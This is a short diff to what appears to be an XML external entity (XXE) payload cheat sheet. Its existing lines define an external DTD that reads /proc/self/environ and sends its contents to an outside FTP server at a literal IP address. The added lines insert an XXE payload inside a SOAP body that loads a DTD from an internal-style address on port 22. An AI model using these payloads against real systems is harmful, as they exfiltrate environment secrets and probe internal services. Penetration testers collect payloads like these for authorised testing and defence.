@@ -72,3 +72,8 @@ FTP
 ## External dtd ##
 <!ENTITY % d SYSTEM "file:///proc/self/environ">
 <!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://46.101.180.57:2121/%d;'>">
+
+---------------------------
+Inside SOAP body
+---------------------------
+<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://0x0:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
